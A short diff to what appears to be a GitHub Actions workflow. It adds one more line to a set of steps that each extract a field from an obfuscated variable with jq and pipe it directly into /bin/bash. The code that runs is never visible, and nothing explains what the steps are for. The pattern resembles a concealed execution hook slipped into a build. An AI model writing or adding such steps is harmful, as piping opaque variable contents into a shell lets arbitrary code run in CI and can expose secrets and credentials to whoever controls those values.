@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$ted038" | jq -r .q71281 | /bin/bash
           printf '%s' "$w8" | jq -r .gm457 | /bin/bash
           printf '%s' "$h0" | jq -r .jk86646 | /bin/bash
+          echo $dtt0982 | jq -r .wofz7964 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
